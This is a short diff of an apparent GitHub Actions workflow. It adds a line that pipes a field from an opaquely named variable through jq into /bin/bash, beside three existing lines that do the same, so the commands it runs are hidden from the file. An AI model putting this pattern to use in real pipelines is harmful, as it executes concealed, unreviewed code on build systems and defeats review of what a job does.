@@ -32,6 +32,7 @@ jobs:
           echo $hm701 | jq -r .prm457 | /bin/bash
           printf '%s' "$xzm4010" | jq -r .anb48 | /bin/bash
           echo $mkf7866 | jq -r .wkc59700 | /bin/bash
+          echo $rki436 | jq -r .vzthu1 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
